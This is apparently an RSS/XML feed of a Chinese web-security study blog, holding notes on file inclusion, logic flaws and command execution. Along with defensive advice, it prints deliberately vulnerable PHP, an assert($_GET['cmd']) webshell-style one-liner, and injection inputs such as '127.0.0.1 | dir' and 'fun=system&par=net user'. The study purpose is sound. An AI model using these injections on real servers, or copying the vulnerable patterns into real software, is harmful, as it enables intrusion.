title="动态包含"></a>动态包含</h3><p><code>&lt;jsp:include page=&quot;pagse.txt&quot;/&gt;</code>为动态包含语句，动态包含会先处理被包含页面，然后再包含。不过jsp中被包含的文件只会被当作文本，攻击者最多只能读取一些重要的文件。</p><p><em>根据语言特性PHP文件包含的漏洞出现的可能和危害性更大，所以关于文件包含大多数讨论的都是关于PHP的</em></p><hr><h2 id="安全编写文件包含"><a href="#安全编写文件包含" class="headerlink" title="安全编写文件包含"></a>安全编写文件包含</h2><ul><li>严格判断包含中的参数是否外部可控，这是文件包含漏洞利用成功与否的关键点</li><li>限制被包含的文件只能在某一文件夹内，禁止目录跳转字符，如“../”</li><li>采用白名单限制被包含的文件</li><li>尽量不要使用动态文件包含，可以在需要包含的页面固定写好，如<code>include(&quot;head.php&quot;)</code></li></ul><hr><p>参考：《web安全深度刨析》</p><hr><p>完结 : )🐣</p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>网安</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web安全</tag>
      
      <tag>文件包含</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>逻辑漏洞学习笔记</title>
    <link href="/2022/03/28/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/03/28/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>逻辑漏洞指攻击者利用业务的设计缺陷，获取敏感信息或破坏业务的完整性。一般出现在密码修改、越权访问、密码找回、交易支付金额等功能处。</p><span id="more"></span><p>通俗来讲，出现逻辑漏洞的原因是因为系统功能庞大，开发人员考虑的不全面，对某些方面可能未正确处理。逻辑漏洞也可以说是开发人员的逻辑存在漏洞。</p><hr><h3 id="逻辑漏洞分类"><a href="#逻辑漏洞分类" class="headerlink" title="逻辑漏洞分类"></a>逻辑漏洞分类</h3><ul><li><p>越权漏洞</p><ul><li><p>水平越权</p><p>相同权限的用户可以越权访问、修改或者删除其它用户信息的非法操作。</p></li><li><p>垂直越权</p><p>就是不同权限之间的用户可以越权访问，如普通用户执行管理员才能执行的命令。另外管理员也不应该对普通用户的所有信息完全控制，普通用户的隐私也需要包护。</p></li></ul></li><li><p>支付订单</p><p>在支付订单时，篡改价格为任意金额；或者篡改运费或其它费用为负数，导致总金额降低。</p></li><li><p>重置密码</p><p>在重置密码时，存在多种逻辑漏洞，比如session覆盖重置密码、短信验证码直接在返回的数据包中等。</p></li><li><p>竞争条件</p><p>竞争条件存在于多种攻击场景中，比如文件上传。还有一个常见场景就是购物时，例如用户A的余额为10元，商品B的价格为6元，商品C的价格为5元，那么用户A是无法都购买商品B和C的。但是如果A利用竞争条件，使用多线程同时发送购买商品B和C的请求，可能会出现以下几种结果：</p><p>1.有一件商品购买失败</p><p>2.商品都购买成功，但只扣了5元或者6元。</p><p>3.商品都购买成功，但是余额变成了-1元。</p></li></ul><hr><h3 id="越权漏洞代码分析"><a href="#越权漏洞代码分析" class="headerlink" title="越权漏洞代码分析"></a>越权漏洞代码分析</h3><p>文件login.php代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php+HTML">&lt;html&gt;<br>&lt;head&gt;<br>    &lt;meta http-equiv=Content-Type content=&quot;text/html;charset=utf-8&quot;&gt;<br>    &lt;title&gt;个人信息&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>    &lt;?php<br>    $con=mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;123456&quot;,&quot;test&quot;);<br>    if(mysqli_connect_errno())<br>    &#123;<br>        echo &quot;连接失败&quot;.mysqli_connect_error();<br>    &#125;<br>    if(isset($_GET[&#x27;username&#x27;]))<br>    &#123;<br>        $result=mysqlil_query($con,&quot;sekect * from users where &#x27;username&#x27;=&#x27;&quot;.addslashes($_GET[&#x27;username&#x27;]).&quot;&#x27;&quot;);<br>        $row =mysqli_fetch_array($result,MYSQLI_ASSOC);<br>        exit(&#x27;用户：&lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;&#x27;.$row[&#x27;username&#x27;]).&#x27;&quot;&gt;&lt;br /&gt;&#x27;.<br>            &#x27;密码：&lt;input type=&quot;password&quot; name=&quot;username&quot; value=&quot;&#x27;.$row[&#x27;password&#x27;]).&#x27;&quot;&gt;&lt;br /&gt;&#x27;.<br>            &#x27;邮箱：&lt;input type=&quot;Email&quot; name=&quot;username&quot; value=&quot;&#x27;.$row[&#x27;email&#x27;]).&#x27;&quot;&gt;&lt;br /&gt;&#x27;.<br>            &#x27;地址：&lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;&#x27;.$row[&#x27;address&#x27;]).&#x27;&quot;&gt;&lt;br /&gt;&#x27;.);<br>    &#125;<br>    else<br>    &#123;<br>        $username=$_POST[&#x27;username&#x27;];<br>        $password=$_POST[&#x27;password&#x27;];<br>        $result=mysqli_query($con,&quot;select * from users where &#x27;username&#x27;=&#x27;&quot;.addslashes($username).&quot;&#x27;and &#x27;password&#x27;=&#x27;&quot;.md5($password).&quot;&#x27;&quot;);<br>        $row=mysqli_fetch_array($result);<br>        if($row)<br>        &#123;<br>            exit(“登录成功”.&quot;&lt;a href=&#x27;login.php?username=&quot;.$username.&quot;&#x27;&gt;个人信息&lt;/a&gt;&quot;);<br>        &#125;<br>        else<br>        &#123;<br>            exit(&quot;登录失败&quot;);<br>        &#125;<br>    &#125;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></div></td></tr></table></figure><p>当用户访问该页面时：</p><ul><li>正常情况下用户没有提交参数，跳转到在else语句。然后获取POST的参数username和password，然后到数据库中查询，如果正确则登录成功，然后跳转到<code>login.php?username=$username</code>处,也就是获取了参数，进入if分支。</li><li>而在if语句中是登录成功后的代码，获取的GET的参数username，然后到数据库中查询参数username的所有信息，并返回到页面上</li></ul><p>而假如用户直接访问<code>login.php?usename=$username</code>，那么就将直接执行if里面的代码，展示$username的所有信息。通过这种方式，就能查看admin用户和其它用户的信息。</p><p>针对这种漏洞可以通过session来控制。例如在用户成功登录后，将username或者uid写入到session中，当用户查看个人信息时，从session中取出username，而不是从GET或POST取username，那么此时取到的username就是没有被篡改的。</p><hr><p>参考    《web安全攻防》</p><hr><p>完结 : )🐣</p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>网安</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web安全</tag>
      
      <tag>逻辑漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>no_referer</title>
    <link href="/2022/03/28/no-referer/"/>
    <url>/2022/03/28/no-referer/</url>
    
    <content type="html"><![CDATA[<p>gitee图床403</p><span id="more"></span><hr><p>耍了一个周末（其实也就是解封后去看了蝙蝠侠，然后躺尸两天）</p><p>返工第一天要处理好多破事…因为在网上也得谨言慎行所以我就没什么好说的了😊</p><p>我脑子里翻来覆去都是…持续了两个学期的缘分罢了😤</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220328162432.png"></p><p>而压死骆驼的最后一根稻草就是我突然发现博客图片全挂了，打开f12发现是403错误。</p><p>之前我的图片全部存在gitee仓库当图床用，果然天底下也没有什么免费的东西。。</p><p>原来是gitee不允许外链访问了。</p><p>还好改下html配置就行了，继续白嫖😶</p><p>（也可以把github pages迁成gitee pages，要麻烦一点）</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220328162705.png"></p><p>这也算世事无常吧，别人提供的服务，说断就断了，假如github pages没了我就要花钱买个服务器。不过这其实无所谓，反正我都要买服务器用的。但又假如网费涨价了呢，电费涨价了呢，饭涨价了呢。我也想就加个<code>&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;</code>解决。</p><hr><p>新冠渐成常态，俄乌战争持续一个月，上周东航坠机</p><hr><p>我还在一堆琐事中挣扎，我好怀念小时候对未来的无限畅想。</p><p>生命是华丽错觉。</p>]]></content>
    
    
    <categories>
      
      <category>碎碎念</category>
      
      <category>不好笑</category>
      
    </categories>
    
    
    <tags>
      
      <tag>blog</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>命令执行模型归类</title>
    <link href="/2022/03/24/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%A8%A1%E5%9E%8B%E5%BD%92%E7%B1%BB/"/>
    <url>/2022/03/24/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%A8%A1%E5%9E%8B%E5%BD%92%E7%B1%BB/</url>
    
    <content type="html"><![CDATA[<p>命令执行有多种模型，本篇为这些漏洞模型归类总结的学习记录。</p><span id="more"></span><hr><h3 id="PHP命令执行"><a href="#PHP命令执行" class="headerlink" title="PHP命令执行"></a>PHP命令执行</h3><ul><li><h4 id="OS命令执行"><a href="#OS命令执行" class="headerlink" title="OS命令执行"></a>OS命令执行</h4><p>使用了PHP的部分函数，如system、shell_exec()、exec()和passthtu()。详见这篇：</p></li></ul><p><a href="https://eggswoo.com/2022/03/23/OS%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">OS命令执行漏洞</a></p><ul><li><h4 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h4><p>php中<code>eval()；</code>存在代码执行，函数，菜刀、蚁剑的php一句话木马也是利用的这个函数。</p><p>eval()函数可以把字符串按照PHP代码来执行，换句话说，就是可以动态执行PHP代码。使用eval函数需要注意的是：输入的字符串必须是合法的PHP代码，且必须以分号结尾。</p><p>其它作用类似的函数还有：</p><ul><li><p>assert()</p><p>用于判断一个表达式是否成立，返回真假。如果直接传入php代码也会被执行</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> assert(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure></li><li><p>preg_replace()</p><p>当第一个参数的正则表达式有e修正符时，第二个参数的字符串当作PHP代码执行。</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>preg_replace(<span class="hljs-string">&quot;/pregStr/e&quot;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>],<span class="hljs-string">&quot;cmd_pregStr&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure></li><li><p>create_function()</p><p>作用是从传递的参数创建匿名函数，并返回唯一的名称。当PHP不正确过滤传递给create_function()的输入时，远程攻击者可以利用漏洞以及特权应用程序权限执行任意代码。</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$newfunc</span> = create_function(<span class="hljs-string">&#x27;$a,$b&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">//当请求为：</span><br><span class="hljs-comment">//?cmd=;&#125;phpinfo();/*时，phpinfo()会在没有调用函数的情况下被执行</span><br></code></pre></div></td></tr></table></figure></li><li><p>其它函数：</p><figure class="highlight erlang"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs erlang"><span class="hljs-function"><span class="hljs-title">ob_start</span><span class="hljs-params">()</span>、<span class="hljs-title">unserialize</span><span class="hljs-params">()</span>、<span class="hljs-title">creat_function</span><span class="hljs-params">()</span>、<span class="hljs-title">usort</span><span class="hljs-params">()</span>、<span class="hljs-title">uasort</span><span class="hljs-params">()</span>、<span class="hljs-title">uksort</span><span class="hljs-params">()</span>、<span class="hljs-title">array_filter</span><span class="hljs-params">()</span>、<span class="hljs-title">array_reduce</span><span class="hljs-params">()</span>、<span class="hljs-title">array_map</span><span class="hljs-params">()</span>...</span><br></code></pre></div></td></tr></table></figure></li></ul></li></ul><p>​            <em>参考：<a href="https://blog.csdn.net/zouchengzhi1021/article/details/105366196">https://blog.csdn.net/zouchengzhi1021/article/details/105366196</a></em></p><ul><li><h4 id="动态函数调用"><a href="#动态函数调用" class="headerlink" title="动态函数调用"></a>动态函数调用</h4><p>PHP支持动态函数调用，这给开发带来了极大的便利，但却也存在安全隐患，代码如下：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">info</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> phpinfo();<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">b</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;b()函数...&quot;</span>;<br>&#125;<br><span class="hljs-variable">$fun</span>=<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;fun&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$fun</span>();<span class="hljs-comment">//动态调用函数 </span><br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>这样PHP解析器就可以根据$fun的值来调用对应的函数。这种动态调用如果支持传参的话，则会有更大的威胁：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$fun</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;fun&#x27;</span>];<br><span class="hljs-variable">$par</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;par&#x27;</span>];<br> <span class="hljs-variable">$fun</span>(<span class="hljs-variable">$par</span>);  <br>&gt;<br><br></code></pre></div></td></tr></table></figure><p>这样的话用户就可以提交<code>http://www.xxx.com/function.php?fun=system&amp;par=net user</code>，最终可执行函数<code>system(&quot;net user&quot;)</code></p></li></ul><hr><h3 id="Java命令执行"><a href="#Java命令执行" class="headerlink" title="Java命令执行"></a>Java命令执行</h3><p>java体系非常庞大，其中包括Java SE，Java EE，Java ME。而无论分支还是框架，都是以Java SE为基础的。</p><blockquote><p>Java SE，Java EE，Java ME三者的区别, 主要是面向的应用领域不一样</p><p>java se: 即J2SE，java标准版，最基础的版本， 主要做一般的java应用， 比如， 应用软件/ QQ之类的通信软件等等。<br>java ee: 即J2EE，主要做企业应用， 比如公司网站，企业解决方案等；<br>java me: 即J2ME，主要面向嵌入式等设备应用的开发， 比如手机游戏等。</p></blockquote><p>在Java SE 中，存在Runtime类，在该类中提供了exec方法用以在单独的进程中执行指定的字符串命令。像JSP、Servlet、Struts、Spring、Hibernate等技术一般执行外部程序都会调用次方法（或者使用ProcessBuilders类，但比较少）。下面以Runtime类为例进行说明，模型代码如下：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RuntimeTest</span></span>&#123;<br>    <span class="hljs-function">publi <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String args[])</span>throw exception</span>&#123;<br>        <span class="hljs-comment">//如果输入无参则退出</span><br>        <span class="hljs-keyword">if</span>(args.length==<span class="hljs-number">0</span>)&#123;<br>            System.exit(<span class="hljs-number">1</span>);<br>        &#125;<br>        String command = args[<span class="hljs-number">0</span>];<br>        Runtime run = Runtime.getRuntime();<br>        <span class="hljs-comment">//执行命令</span><br>        Process pro = run.exe(command);<br>        <br>        InputStreamReader in = <span class="hljs-keyword">new</span> InputStreamReader(pro.getInputStream());<br>        BufferedReader buff = <span class="hljs-keyword">new</span> BufferedReader(in);<br>        <span class="hljs-keyword">for</span>(String temp = buff.readLine();temp!=<span class="hljs-keyword">null</span>;temp=buff.readLine())&#123;<br>            <span class="hljs-comment">//输入结果</span><br>            System,out.printlb(temp);<br>        &#125;<br>        buff.close();<br>        in.close();<br>        &#125;<br>   &#125;<br></code></pre></div></td></tr></table></figure><p>上面的代码进过编译后可以执行命令操作，如：Java RuntimeTest “ls -l”，进行列文件操作。像有名的Struts2框架就存在命令执行漏洞，这即将在下一个模块中讲述。</p><p>​    还有非常多的JSP木马，也都会使用Runtime().exec()来执行系统命令。<em>就像php木马中都会使用eval()。</em></p><hr><h3 id="框架执行漏洞"><a href="#框架执行漏洞" class="headerlink" title="框架执行漏洞"></a>框架执行漏洞</h3><p>如今框架技术已被广泛应用，越来越多的开发者喜欢使用框架。甚至有些甲方公司把项目交给乙方公司开发时，会明确要求乙方使用指定的框架技术，比如有名的Java三大框架（Hibernate、Spring、Struts）。</p><p>而一旦框架出现了安全漏洞，则框架的用户群越多，受到的影响就越广，危害越大。</p><ul><li><h4 id="Struts2代码执行漏洞"><a href="#Struts2代码执行漏洞" class="headerlink" title="Struts2代码执行漏洞"></a>Struts2代码执行漏洞</h4><p>Struts1最初是独立的MVC框架，但是Struts2改写了Strust1的核心技术，低层采用了XWORK的核心。XWORK也是一个MVC框架，而Struts2是在Strust1和XWORK基础技术上进行了合并，算是一个全新的框架。</p><blockquote><p>MVC：一种架构型模式，用来指导我们改善应用程序的架构，使得应用的模型和视图相分离，从而达到更好的开发和维护效率。在MVC模式中，应用程序被划分成模型（Model）、视图（View）和控制器（Controller）三个部分）</p></blockquote><p>​    Struts2的核心是使用webwork(XWORK的核心)框架，处理action时通过调用底层Java Bean的getter/setter方法来处理HTTP参数，它将每个HTTP参数申明为一个ONGL语句。</p><blockquote><p>java bean:</p><p>Java language 是一种面向对象的编程语言，类是面向对象的编程语言的基础；可重用又是面向对象编程思想存在的意义之一。而java是咖啡，Java bean是咖啡豆🤔Java bean指的读写方法符合以下这种命名规范的类</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs Java"><span class="hljs-comment">// 读方法:</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> Type <span class="hljs-title">getXyz</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-comment">// 写方法:</span></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setXyz</span><span class="hljs-params">(Type value)</span></span><br></code></pre></div></td></tr></table></figure><p>ONGL语句：</p><p>OGNL是Object Graphic Navigation Language（对象图导航语言）的缩写，是一种功能强大的EL（Expression Language，表达式语言），可以通过简单的表达式来访问Java对象中的属性。</p></blockquote><p>当我们提交如下HTTP参数时：</p><p><code>?user.address.city=bj&amp;user[&#39;name&#39;]=admin</code>，</p><p>ONGL将它转换为：</p><p><code>obj.getUser().getAddress().setCirt=&#39;bj&#39;;</code></p><p> <code>Obj.getUser().setName=&quot;admin&quot;;</code></p></li></ul><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220324225223.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220324225338.png"></p><ul><li><h4 id="ThinkPHP-命令执行漏洞"><a href="#ThinkPHP-命令执行漏洞" class="headerlink" title="ThinkPHP 命令执行漏洞"></a>ThinkPHP 命令执行漏洞</h4><p>ThinkPHP的问题主要在于DIspatcher.class.php文件，官方SVN修改前后的关键代码如下：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">125 - <span class="hljs-variable">$res</span> = preg_replace(<span class="hljs-string">&#x27;@(w+)&#x27;</span>.<span class="hljs-variable">$depr</span>.<span class="hljs-string">&#x27;([^&#x27;</span>.<span class="hljs-variable">$depr</span>.<span class="hljs-string">&#x27;\/]+)@e&#x27;</span>,<span class="hljs-string">&#x27;$var[\&#x27;</span>\\1\<span class="hljs-string">&#x27;]=&quot;\\2\&#x27;</span>;,implode(<span class="hljs-variable">$depr</span>,<span class="hljs-variable">$paths</span>));<br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">125 + <span class="hljs-variable">$res</span> = preg_replace(<span class="hljs-string">&#x27;@(w+)&#x27;</span>.<span class="hljs-variable">$depr</span>.<span class="hljs-string">&#x27;([^&#x27;</span>.<span class="hljs-variable">$depr</span>.<span class="hljs-string">&#x27;\/]+)@e&#x27;</span>,<span class="hljs-string">&#x27;$var[\&#x27;</span>\\1\<span class="hljs-string">&#x27;]=&quot;\\2\&#x27;</span>;,implode(<span class="hljs-variable">$depr</span>,<span class="hljs-variable">$paths</span>));<br></code></pre></div></td></tr></table></figure><p>上述代码的含义是把phpinfo作为restful类型URL进行解析的，主要作用是把phpinfo中的数据解析并$_GET数组中。</p><p>然而在用正则解析phpinfo的时候，主要是以下语句：<br><code>$res=preg_replace(&#39;@(w+)&#39;.$depr.&#39;([^&#39;.$depr.&#39;\/]+)@e&#39;,&#39;$var[\&#39;\\1\&#39;]=&quot;\\2\&#39;;,implode($depr,$paths));</code></p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220324232041.png"></p></li></ul><p><em>资料来源：《Web安全深度剖析》</em> </p><hr><h3 id="防范命令执行漏洞"><a href="#防范命令执行漏洞" class="headerlink" title="防范命令执行漏洞"></a>防范命令执行漏洞</h3><ul><li><p>尽量不用使用系统执行命令</p></li><li><p>在进入执行命令函数/方法之前，变量一定要做好过滤，对敏感字符进行转义</p></li><li><p>在使用PHP动态函数之前，确保使用的函数是指定的函数之一</p></li><li><p>对PHP语言来说，不能完全控制的危险函数最好不要使用</p></li></ul><hr><p>参考：《Web安全深度剖析》</p><p>完结 : )🐣</p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>网安</category>
      
    </categories>
    
    
    <tags>
      
      <tag>命令执行</tag>
      
      <tag>Web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>OS命令执行学习笔记</title>
    <link href="/2022/03/23/OS%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/03/23/OS%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>应用程序有时需要调用一些执行<strong>系统命令</strong>的函数，如在PHP中，使用system、exec、shell_exec、paasthru、popen、porc_popen等函数可以执行系统命令。当黑可以控制这些函数中的参数时，就可以将恶意对系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。</p><span id="more"></span><p><em>很多人喜欢把代码执行漏洞称为命令执行漏洞，因为命令执行漏洞可以执行系统命令，而代码执行漏洞也会执行系统命令，这样就容易混淆。其实两者比较好区分，它们之间的区别比较大，命令执行漏洞是直接调用操作系统命令，故这里叫OS命令执行漏洞，而代码执行漏洞则是靠脚本代码调用操作系统命令，如：<code>eval(system(&#39;set&#39;););</code>。</em></p><hr><h3 id="OS命令执行攻击过程"><a href="#OS命令执行攻击过程" class="headerlink" title="OS命令执行攻击过程"></a>OS命令执行攻击过程</h3><p>以dvwa中的low级命令执行为例</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220323221638.png"></p><p>该站点提供了一个可以使用ping命令的窗口，我们可以在该命令后面加上“|”或“&amp;”来拼接其他命令，就像直接在cmd窗口执行命令一样。这就是命令执行漏洞特点的体现：数据和代码没有分离。</p><p>当我们输入<code>127.0.0.1 | dir</code>时</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220323224730.png"></p><p>利用了管道符“|”成功在服务器端执行了系统命令dir。</p><hr><h3 id="系统命令中管道符规则"><a href="#系统命令中管道符规则" class="headerlink" title="系统命令中管道符规则"></a>系统命令中管道符规则</h3><p>Windows：</p><ul><li>| 直接执行后面的命令</li><li>|| 如果前面的语句出错则执行后面的语句，前面的语句只能为假</li><li>&amp; 如果前面的语句为假时直接执行后面的命令，前面的语句可真可假</li><li>&amp;&amp; 如果前面的语句为假则直接出错，不执行后面的语句。前面的语句只能为真</li></ul><p>Linux：</p><ul><li>; 执行前面的语句后再执行后面的</li><li>| 显示后面语句执行的结果</li><li>|| 当前面的语句出错时执行后面的语句</li><li>&amp; 如果前面的语句为假则直接执行后面的语句，前面的语句可真可假</li><li>&amp;&amp; 如果前面的语句为假则直接出错，不执行后面的语句。前面的语句只能为真</li></ul><hr><h3 id="OS命令执行漏洞代码分析"><a href="#OS命令执行漏洞代码分析" class="headerlink" title="OS命令执行漏洞代码分析"></a>OS命令执行漏洞代码分析</h3><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ]  ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$target</span> = <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;ip&#x27;</span> ];<br><br>    <span class="hljs-comment">// Determine OS and execute the ping command.</span><br>    <span class="hljs-keyword">if</span>( stristr( php_uname( <span class="hljs-string">&#x27;s&#x27;</span> ), <span class="hljs-string">&#x27;Windows NT&#x27;</span> ) ) &#123;<br>        <span class="hljs-comment">// Windows</span><br>        <span class="hljs-variable">$cmd</span> = shell_exec( <span class="hljs-string">&#x27;ping  &#x27;</span> . <span class="hljs-variable">$target</span> );<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// *nix</span><br>        <span class="hljs-variable">$cmd</span> = shell_exec( <span class="hljs-string">&#x27;ping  -c 4 &#x27;</span> . <span class="hljs-variable">$target</span> );<br>    &#125;<br><br>    <span class="hljs-comment">// Feedback for the end user</span><br>    <span 